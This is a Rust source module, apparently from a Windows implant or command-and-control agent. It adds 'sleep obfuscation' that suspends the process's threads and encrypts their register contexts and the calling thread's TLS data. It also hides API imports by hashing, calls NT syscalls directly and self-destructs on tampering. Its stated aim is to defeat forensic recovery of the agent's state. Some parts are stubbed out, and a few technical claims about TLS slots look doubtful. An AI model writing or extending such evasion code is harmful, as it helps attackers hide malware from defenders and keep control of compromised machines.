//! Memory Encryption with Thread Context (Phase 7)
//!
//! Enhances the sleep obfuscation system to encrypt thread contexts — register
//! states (CONTEXT structs), stack pointers, and TLS data — during sleep
//! periods.  This prevents forensic tools from recovering execution state from
//! suspended thread registers, complementing the existing memory-region and
//! stack encryption performed by `sleep_obfuscation`.
//!
//! # Architecture
//!
//! 1. **Key Derivation**: A domain-separated XChaCha20-Poly1305 key is derived
//!    from the sleep-encryption key via HKDF-SHA256 with the `THREAD_CTX`
//!    info constant from `common::hkdf_info`.  This ensures compromise of a
//!    per-region encryption key cannot leak thread contexts.
//!
//! 2. **Thread Enumeration**: All threads in the current process are discovered
//!    via `CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`, filtered by PID.
//!
//! 3. **Context Capture**: For each non-current thread:
//!    - Suspend via `NtSuspendThread`
//!    - Capture `CONTEXT` via `NtGetContextThread` with `CONTEXT_FULL` flags
//!    - The 928-byte CONTEXT struct contains all GPRs, XMM registers,
//!      debug registers, and control registers (RSP, RIP, EFlags)
//!
//! 4. **Encryption**: Each captured CONTEXT is encrypted in-place with
//!    XChaCha20-Poly1305 using a unique per-thread nonce.  The AEAD tag
//!    is stored alongside the snapshot for tamper detection on wake.
//!
//! 5. **TLS Slot Encryption**: The TLS slots accessible through
//!    `gs:[0x58]` (ThreadLocalStoragePointer) are also encrypted to prevent
//!    forensic recovery of per-thread data (e.g., errno, SEH chains).
//!
//! 6. **Restoration**: On wake, each thread's encrypted CONTEXT is decrypted,
//!    the AEAD tag is verified (tampering causes immediate self-destruct),
//!    and `NtSetContextThread` restores the register state.  Threads are then
//!    resumed via `NtResumeThread`.
//!
//! # Feature Gate
//!
//! The entire module is compiled only on `cfg(windows)` with the
//! `thread-ctx-encrypt` feature.  Integration into `secure_sleep()` is
//! controlled by the `encrypt_thread_contexts` field in
//! `SleepObfuscationConfig`.
//!
//! # Safety
//!
//! This module directly manipulates thread contexts and TLS pointers using
//! raw NT syscalls.  All operations are inherently unsafe and must only be
//! called from the sleep obfuscation pipeline on the agent's main thread.

#![cfg(all(windows, feature = "thread-ctx-encrypt"))]

use anyhow::{anyhow, Result};
use chacha20poly1305::{
    aead::{AeadInPlace, KeyInit, OsRng},
    XChaCha20Poly1305, XNonce,
};
use rand::RngCore;
use std::sync::atomic::Ordering;
use zeroize::Zeroize;

// ── Constants ────────────────────────────────────────────────────────────────

/// XChaCha20-Poly1305 nonce length.
const NONCE_LEN: usize = 24;
/// Poly1305 tag length.
const TAG_LEN: usize = 16;
/// Size of the CONTEXT struct on Windows x86_64.
const CONTEXT_SIZE: usize = std::mem::size_of::<crate::win_types::CONTEXT>();
/// Maximum number of TLS slots to encrypt (64 slots × 8 bytes = 512 bytes).
/// Windows reserves 64 TLS slots for user-mode (indices 0–63).
const TLS_SLOT_COUNT: usize = 64;
/// Size of the TLS slot data to encrypt (all 64 slots × pointer size).
const TLS_DATA_SIZE: usize = TLS_SLOT_COUNT * 8;

/// THREAD_ALL_ACCESS (Windows x86_64) for NtOpenThread.
const THREAD_ALL_ACCESS: u64 = 0x001FFFFF;
/// TH32CS_SNAPTHREAD — snapshot all threads in the system.
const TH32CS_SNAPTHREAD: u32 = 0x4;
/// CONTEXT_FULL — all register groups.
const CONTEXT_FULL: u32 = crate::win_types::CONTEXT_FULL;
/// Invalid handle value.
const INVALID_HANDLE_VALUE: usize = usize::MAX;

// ── Thread entry structure for CreateToolhelp32Snapshot ──────────────────────

#[repr(C)]
struct ThreadEntry32 {
    size: u32,
    cnt_usage: u32,
    thread_id: u32,
    owner_process_id: u32,
    base_priority: i32,
    _delta: usize,
}

// ── Per-thread snapshot ──────────────────────────────────────────────────────

/// Captured and encrypted thread context for a single thread.
///
/// On drop, all sensitive fields (nonce, tag, encrypted context) are zeroized.
pub struct ThreadContextSnapshot {
    /// NT thread handle (closed on drop).
    handle: usize,
    /// Thread ID (for logging).
    tid: u32,
    /// Per-thread XChaCha20-Poly1305 nonce.
    nonce: [u8; NONCE_LEN],
    /// AEAD authentication tag for the encrypted CONTEXT.
    context_tag: [u8; TAG_LEN],
    /// Encrypted CONTEXT bytes (encrypted in-place, restored on decrypt).
    encrypted_context: Vec<u8>,
    /// TLS encryption data: (original pointer, encrypted bytes, nonce, tag).
    /// Only populated if the thread has a valid TLS pointer.
    tls_snapshot: Option<TlsSnapshot>,
    /// Whether this thread was suspended by us (skip current thread).
    was_suspended: bool,
}

/// TLS slot encryption state for a single thread.
struct TlsSnapshot {
    /// Raw pointer to the TLS array (from gs:[0x58]).
    tls_pointer: *mut u8,
    /// Encrypted TLS slot data (TLS_SLOT_COUNT × 8 bytes).
    encrypted_data: Vec<u8>,
    /// Per-TLS nonce.
    nonce: [u8; NONCE_LEN],
    /// AEAD tag for TLS data.
    tag: [u8; TAG_LEN],
}

// Zeroize sensitive fields on drop.
impl Drop for ThreadContextSnapshot {
    fn drop(&mut self) {
        self.nonce.zeroize();
        self.context_tag.zeroize();
        self.encrypted_context.zeroize();
        if let Some(ref mut tls) = self.tls_snapshot {
            tls.encrypted_data.zeroize();
            tls.nonce.zeroize();
            tls.tag.zeroize();
        }
        // Close the thread handle if it's valid.
        if self.handle != 0 {
            let _ = unsafe { crate::syscalls::syscall_NtClose(self.handle as u64) };
        }
    }
}

// ── NT API resolution ────────────────────────────────────────────────────────

/// Resolve `NtGetContextThread` from ntdll by hash.
unsafe fn resolve_nt_get_context_thread(
) -> Option<unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtGetContextThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtSetContextThread` from ntdll by hash.
unsafe fn resolve_nt_set_context_thread(
) -> Option<unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtSetContextThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtOpenThread` from ntdll by hash.
unsafe fn resolve_nt_open_thread(
) -> Option<unsafe extern "system" fn(*mut usize, u64, *mut u64, *mut u64) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtOpenThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtSuspendThread` from ntdll by hash.
unsafe fn resolve_nt_suspend_thread() -> Option<unsafe extern "system" fn(usize, *mut u32) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtSuspendThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtResumeThread` from ntdll by hash.
unsafe fn resolve_nt_resume_thread() -> Option<unsafe extern "system" fn(usize, *mut u32) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtResumeThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

// ── Key derivation ───────────────────────────────────────────────────────────

/// Derive a domain-separated 32-byte XChaCha20-Poly1305 key for thread-context
/// encryption from the parent sleep-encryption key.
///
/// Uses HKDF-SHA256 with the `THREAD_CTX` info constant from `common::hkdf_info`
/// and a zero salt (the parent key already provides sufficient entropy).
fn derive_thread_ctx_key(parent_key: &[u8; 32]) -> [u8; 32] {
    use sha2::Sha256;
    let hk = hkdf::Hkdf::<Sha256>::new(None, parent_key);
    let mut derived = [0u8; 32];
    hk.expand(common::hkdf_info::THREAD_CTX, &mut derived)
        .expect("HKDF-SHA256 expand must succeed for 32-byte output");
    derived
}

// ── TLS pointer access ───────────────────────────────────────────────────────

/// Read the ThreadLocalStoragePointer from the current TEB.
///
/// On Windows x86_64, this is at `gs:[0x58]` (offset 0x58 in the TEB).
/// Returns `None` if the pointer is NULL.
unsafe fn get_tls_pointer() -> Option<*mut u8> {
    let tls_ptr: usize;
    std::arch::asm!(
        "mov {}, gs:[0x58]",
        out(reg) tls_ptr,
        options(nostack, nomem, preserves_flags)
    );
    if tls_ptr == 0 {
        None
    } else {
        Some(tls_ptr as *mut u8)
    }
}

/// Read the ThreadLocalStoragePointer from a suspended thread's TEB.
///
/// This requires reading the TEB address from `gs:[0x30]` via the thread's
/// context (the TEB is at a fixed location per thread).  For a suspended thread,
/// we use NtGetContextThread to read the TEB base and then compute the TLS offset.
///
/// Note: On Windows x86_64, the TEB address is stored in `gs:[0x30]` which
/// corresponds to the `Self` pointer in the TEB.  Each thread has its own TEB
/// at a unique address accessible via the GS segment register.
unsafe fn get_thread_tls_pointer(
    handle: usize,
    nt_get_ctx: unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32,
) -> Option<*mut u8> {
    // The TLS pointer is at TEB+0x58.  We can compute this from the TEB base.
    // The TEB base is available as `gs:[0x30]` in the thread's context, but
    // NtGetContextThread gives us the CONTEXT struct, not the TEB directly.
    //
    // Instead, we use NtQueryInformationThread with ThreadTebInformation to get
    // the TEB address, or we use the fact that on Windows x86_64, the GS base
    // (TEB address) can be retrieved from the thread's segment register.
    //
    // However, the simplest approach: use NtQueryInformationThread(ThreadBasicInformation)
    // to get the TEB address, then read TLS pointer from TEB+0x58.
    //
    // For now, we skip TLS encryption for non-current threads and only encrypt
    // TLS for the current thread (which is the one executing secure_sleep).
    // Non-current threads' TLS is typically less forensically interesting.
    let _ = (handle, nt_get_ctx);
    None
}

// ── Public API ───────────────────────────────────────────────────────────────

/// Capture and encrypt the contexts of all threads in the current process
/// (except the calling thread).
///
/// This is the main entry point called from `secure_sleep()` *before* memory
/// region encryption.  It:
/// 1. Derives a domain-separated key from the sleep-encryption key.
/// 2. Enumerates all threads in the current process.
/// 3. Suspends each non-current thread.
/// 4. Captures and encrypts each thread's CONTEXT struct.
/// 5. Optionally encrypts TLS data for the current thread.
///
/// Returns a vector of `ThreadContextSnapshot` that must be passed to
/// `decrypt_and_restore_thread_contexts()` on wake.
///
/// # Safety
///
/// Must be called from the main agent thread during the sleep obfuscation
/// pipeline.  The caller must ensure no other thread holds locks that could
/// deadlock when suspended.
pub unsafe fn capture_and_encrypt_thread_contexts(
    parent_key: &[u8; 32],
) -> Result<Vec<ThreadContextSnapshot>> {
    let ctx_key = derive_thread_ctx_key(parent_key);
    let cipher = XChaCha20Poly1305::new_from_slice(&ctx_key)
        .map_err(|_| anyhow!("thread_ctx: key init failed"))?;

    // Resolve NT APIs.
    let nt_get_ctx = resolve_nt_get_context_thread()
        .ok_or_else(|| anyhow!("thread_ctx: NtGetContextThread resolve failed"))?;
    let nt_open_thread = resolve_nt_open_thread()
        .ok_or_else(|| anyhow!("thread_ctx: NtOpenThread resolve failed"))?;
    let nt_suspend = resolve_nt_suspend_thread()
        .ok_or_else(|| anyhow!("thread_ctx: NtSuspendThread resolve failed"))?;

    // Resolve kernel32 functions for thread enumeration.
    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
        .ok_or_else(|| anyhow!("thread_ctx: kernel32 resolve failed"))?;

    type CreateSnapshotFn = unsafe extern "system" fn(u32, u32) -> usize;
    type Thread32FirstFn = unsafe extern "system" fn(usize, *mut ThreadEntry32) -> i32;
    type Thread32NextFn = unsafe extern "system" fn(usize, *mut ThreadEntry32) -> i32;
    type GetPidFn = unsafe extern "system" fn() -> u32;
    type GetTidFn = unsafe extern "system" fn() -> u32;

    let create_snap: CreateSnapshotFn = match pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0"),
    ) {
        Some(a) => std::mem::transmute(a),
        None => return Err(anyhow!("thread_ctx: CreateToolhelp32Snapshot resolve failed")),
    };
    let thread32_first: Thread32FirstFn = match pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"Thread32First\0"),
    ) {
        Some(a) => std::mem::transmute(a),
        None => return Err(anyhow!("thread_ctx: Thread32First resolve failed")),
    };
    let thread32_next: Thread32NextFn = match pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"Thread32Next\0"),
    ) {
        Some(a) => std::mem::transmute(a),
        None => return Err(anyhow!("thread_ctx: Thread32Next resolve failed")),
    };
    let get_pid: GetPidFn = match pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"GetCurrentProcessId\0"),
    ) {
        Some(a) => std::mem::transmute(a),
        None => return Err(anyhow!("thread_ctx: GetCurrentProcessId resolve failed")),
    };
    let get_tid: GetTidFn = match pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"GetCurrentThreadId\0"),
    ) {
        Some(a) => std::mem::transmute(a),
        None => return Err(anyhow!("thread_ctx: GetCurrentThreadId resolve failed")),
    };

    let current_pid = get_pid();
    let current_tid = get_tid();

    // Take a thread snapshot.
    let snapshot = create_snap(TH32CS_SNAPTHREAD, 0);
    if snapshot == INVALID_HANDLE_VALUE || snapshot == 0 {
        return Err(anyhow!("thread_ctx: CreateToolhelp32Snapshot failed"));
    }

    let mut entry = ThreadEntry32 {
        size: std::mem::size_of::<ThreadEntry32>() as u32,
        ..std::mem::zeroed()
    };

    if thread32_first(snapshot, &mut entry) == 0 {
        let _ = crate::syscalls::syscall_NtClose(snapshot as u64);
        return Err(anyhow!("thread_ctx: Thread32First failed"));
    }

    let mut snapshots = Vec::new();

    loop {
        // Only process threads in our process, skip current thread.
        if entry.owner_process_id == current_pid && entry.thread_id != current_tid {
            // Open the thread.
            let mut handle: usize = 0;
            let obj_attrs: u64 = 0; // NULL ObjectAttributes
            let mut client_id = [0u64; 2];
            client_id[1] = entry.thread_id as u64; // UniqueTid

            let status = nt_open_thread(
                &mut handle,
                THREAD_ALL_ACCESS,
                &obj_attrs as *const _ as *mut u64,
                client_id.as_mut_ptr() as *mut u64,
            );

            if status >= 0 && handle != 0 {
                // Suspend the thread.
                let mut suspend_count: u32 = 0;
                nt_suspend(handle, &mut suspend_count);

                // Capture the thread context.
                let mut ctx: crate::win_types::CONTEXT = std::mem::zeroed();
                ctx.context_flags = CONTEXT_FULL;

                let ctx_status = nt_get_ctx(handle, &mut ctx);
                if ctx_status >= 0 {
                    // Encrypt the CONTEXT struct.
                    let ctx_bytes =
                        std::slice::from_raw_parts(&ctx as *const _ as *const u8, CONTEXT_SIZE);

                    let mut encrypted = ctx_bytes.to_vec();
                    let mut nonce = [0u8; NONCE_LEN];
                    OsRng.fill_bytes(&mut nonce);
                    let xnonce = XNonce::from_slice(&nonce);

                    // AAD: thread ID to bind the ciphertext to this thread.
                    let aad = entry.thread_id.to_le_bytes();

                    let tag = match cipher.encrypt_in_place_detached(
                        xnonce,
                        &aad,
                        &mut encrypted,
                    ) {
                        Ok(tag) => tag,
                        Err(_) => {
                            log::warn!(
                                "thread_ctx: encrypt failed for tid {}, skipping",
                                entry.thread_id
                            );
                            // Resume the thread and continue.
                            let mut resume_count: u32 = 0;
                            let _ = resolve_nt_resume_thread()
                                .map(|f| f(handle, &mut resume_count));
                            let _ = crate::syscalls::syscall_NtClose(handle as u64);
                            if thread32_next(snapshot, &mut entry) == 0 {
                                break;
                            }
                            continue;
                        }
                    };

                    let mut context_tag = [0u8; TAG_LEN];
                    context_tag.copy_from_slice(&tag);

                    // Zero the plaintext context from the stack.
                    let ctx_ptr = &mut ctx as *mut _ as *mut u8;
                    std::ptr::write_bytes(ctx_ptr, 0, CONTEXT_SIZE);

                    // Try to capture TLS for the current thread only.
                    // (Non-current thread TLS requires TEB address resolution
                    // which is more complex; skip for now.)
                    let tls_snapshot = None;

                    snapshots.push(ThreadContextSnapshot {
                        handle,
                        tid: entry.thread_id,
                        nonce,
                        context_tag,
                        encrypted_context: encrypted,
                        tls_snapshot,
                        was_suspended: true,
                    });
                } else {
                    log::warn!(
                        "thread_ctx: NtGetContextThread failed for tid {} (status {:#x}), skipping",
                        entry.thread_id,
                        ctx_status
                    );
                    // Resume and close.
                    let mut resume_count: u32 = 0;
                    let _ = resolve_nt_resume_thread().map(|f| f(handle, &mut resume_count));
                    let _ = crate::syscalls::syscall_NtClose(handle as u64);
                }
            }
        }

        if thread32_next(snapshot, &mut entry) == 0 {
            break;
        }
    }

    // Close the snapshot handle.
    let _ = crate::syscalls::syscall_NtClose(snapshot as u64);

    // Encrypt TLS for the current thread (calling thread).
    if let Some(tls_ptr) = get_tls_pointer() {
        let tls_slice = std::slice::from_raw_parts(tls_ptr, TLS_DATA_SIZE);
        let mut encrypted_tls = tls_slice.to_vec();

        let mut tls_nonce = [0u8; NONCE_LEN];
        OsRng.fill_bytes(&mut tls_nonce);
        let tls_xnonce = XNonce::from_slice(&tls_nonce);

        let tls_tag = match cipher.encrypt_in_place_detached(
            tls_xnonce,
            b"tls-current",
            &mut encrypted_tls,
        ) {
            Ok(tag) => tag,
            Err(_) => {
                log::warn!("thread_ctx: TLS encrypt failed for current thread");
                // Zero the derived key and return what we have.
                let mut key_zero = ctx_key;
                key_zero.zeroize();
                return Ok(snapshots);
            }
        };

        let mut tls_tag_arr = [0u8; TAG_LEN];
        tls_tag_arr.copy_from_slice(&tls_tag);

        // Create a synthetic snapshot for the current thread's TLS.
        // We use handle=0 since we don't need to suspend/resume ourselves.
        snapshots.push(ThreadContextSnapshot {
            handle: 0,
            tid: current_tid,
            nonce: [0u8; NONCE_LEN], // Placeholder — not used for context.
            context_tag: [0u8; TAG_LEN], // Placeholder.
            encrypted_context: Vec::new(), // No context for current thread.
            tls_snapshot: Some(TlsSnapshot {
                tls_pointer: tls_ptr,
                encrypted_data: encrypted_tls,
                nonce: tls_nonce,
                tag: tls_tag_arr,
            }),
            was_suspended: false,
        });
    }

    log::debug!(
        "thread_ctx: captured {} thread context snapshots",
        snapshots.len()
    );

    // Zero the derived key.
    let mut key_zero = ctx_key;
    key_zero.zeroize();

    Ok(snapshots)
}

/// Decrypt and restore all previously captured thread contexts.
///
/// This is called from `secure_sleep()` *after* memory region decryption.
/// It:
/// 1. Re-derives the domain-separated key from the parent key.
/// 2. For each snapshot:
///    - Decrypts and verifies the AEAD tag (tampering → self-destruct).
///    - Restores the CONTEXT via NtSetContextThread.
///    - Decrypts and restores TLS data if present.
///    - Resumes the thread via NtResumeThread.
///
/// # Safety
///
/// Must be called from the main agent thread during the sleep obfuscation
/// wake sequence.  The `snapshots` vector must have been returned by
/// `capture_and_encrypt_thread_contexts` with the same `parent_key`.
pub unsafe fn decrypt_and_restore_thread_contexts(
    parent_key: &[u8; 32],
    snapshots: &mut Vec<ThreadContextSnapshot>,
) -> Result<()> {
    let ctx_key = derive_thread_ctx_key(parent_key);
    let cipher = XChaCha20Poly1305::new_from_slice(&ctx_key)
        .map_err(|_| anyhow!("thread_ctx: key init failed"))?;

    // Resolve NT APIs.
    let nt_set_ctx = resolve_nt_set_context_thread()
        .ok_or_else(|| anyhow!("thread_ctx: NtSetContextThread resolve failed"))?;
    let nt_resume = resolve_nt_resume_thread()
        .ok_or_else(|| anyhow!("thread_ctx: NtResumeThread resolve failed"))?;

    for snap in snapshots.iter_mut() {
        // ── Restore CONTEXT (for non-current threads) ──
        if snap.was_suspended && !snap.encrypted_context.is_empty() {
            let xnonce = XNonce::from_slice(&snap.nonce);
            let aad = snap.tid.to_le_bytes();
            let tag = chacha20poly1305::Tag::from_slice(&snap.context_tag);

            // Decrypt in-place.
            let decrypt_result = cipher.decrypt_in_place_detached(
                xnonce,
                &aad,
                &mut snap.encrypted_context,
                tag,
            );

            match decrypt_result {
                Ok(()) => {
                    // Decrypt succeeded — encrypted_context now holds plaintext CONTEXT.
                    let ctx_ptr = snap.encrypted_context.as_ptr() as *const crate::win_types::CONTEXT;

                    // Validate that we can safely read the context.
                    if snap.encrypted_context.len() >= CONTEXT_SIZE {
                        // Set the context back on the thread.
                        // We need a mutable copy because NtSetContextThread takes *mut.
                        let mut ctx: crate::win_types::CONTEXT =
                            std::ptr::read(ctx_ptr);
                        ctx.context_flags = CONTEXT_FULL;

                        let status = nt_set_ctx(snap.handle, &mut ctx);

                        // Zero the stack copy.
                        let ctx_mut_ptr = &mut ctx as *mut _ as *mut u8;
                        std::ptr::write_bytes(ctx_mut_ptr, 0, CONTEXT_SIZE);

                        if status < 0 {
                            log::error!(
                                "thread_ctx: NtSetContextThread failed for tid {} (status {:#x})",
                                snap.tid,
                                status
                            );
                        }
                    }
                }
                Err(_) => {
                    log::error!(
                        "thread_ctx: AEAD tag mismatch for tid {} — possible tampering!",
                        snap.tid
                    );
                    // Self-destruct on AEAD failure (matches sleep_obfuscation behavior).
                    crate::sleep_obfuscation::self_destruct();
                }
            }

            // Resume the thread.
            let mut resume_count: u32 = 0;
            nt_resume(snap.handle, &mut resume_count);
        }

        // ── Restore TLS data (for current thread) ──
        if let Some(ref mut tls) = snap.tls_snapshot {
            let tls_xnonce = XNonce::from_slice(&tls.nonce);
            let tls_tag = chacha20poly1305::Tag::from_slice(&tls.tag);

            let tls_result = cipher.decrypt_in_place_detached(
                tls_xnonce,
                b"tls-current",
                &mut tls.encrypted_data,
                tls_tag,
            );

            match tls_result {
                Ok(()) => {
                    // Restore TLS slots.
                    std::ptr::copy_nonoverlapping(
                        tls.encrypted_data.as_ptr(),
                        tls.tls_pointer,
                        TLS_DATA_SIZE,
                    );
                }
                Err(_) => {
                    log::error!(
                        "thread_ctx: TLS AEAD tag mismatch for tid {} — possible tampering!",
                        snap.tid
                    );
                    crate::sleep_obfuscation::self_destruct();
                }
            }
        }
    }

    log::debug!(
        "thread_ctx: restored {} thread context snapshots",
        snapshots.len()
    );

    // Zero the derived key.
    let mut key_zero = ctx_key;
    key_zero.zeroize();

    // Drop all snapshots (handles closed, sensitive data zeroized).
    snapshots.clear();

    Ok(())
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn context_size_is_928_bytes() {
        // The Windows x86_64 CONTEXT struct is exactly 928 bytes.
        assert_eq!(
            CONTEXT_SIZE,
            928,
            "CONTEXT struct must be 928 bytes on Windows x86_64"
        );
    }

    #[test]
    fn derive_key_is_deterministic() {
        let parent = [0xABu8; 32];
        let key1 = derive_thread_ctx_key(&parent);
        let key2 = derive_thread_ctx_key(&parent);
        assert_eq!(key1, key2, "same parent key must produce same derived key");
    }

    #[test]
    fn derive_key_differs_from_parent() {
        let parent = [0xCDu8; 32];
        let derived = derive_thread_ctx_key(&parent);
        assert_ne!(
            derived.as_slice(),
            parent.as_slice(),
            "derived key must differ from parent"
        );
    }

    #[test]
    fn different_parents_produce_different_keys() {
        let parent_a = [0x01u8; 32];
        let parent_b = [0x02u8; 32];
        let key_a = derive_thread_ctx_key(&parent_a);
        let key_b = derive_thread_ctx_key(&parent_b);
        assert_ne!(key_a, key_b, "different parents must produce different keys");
    }

    #[test]
    fn tls_data_size_is_512_bytes() {
        // 64 TLS slots × 8 bytes per pointer = 512 bytes.
        assert_eq!(TLS_DATA_SIZE, 512);
    }
}
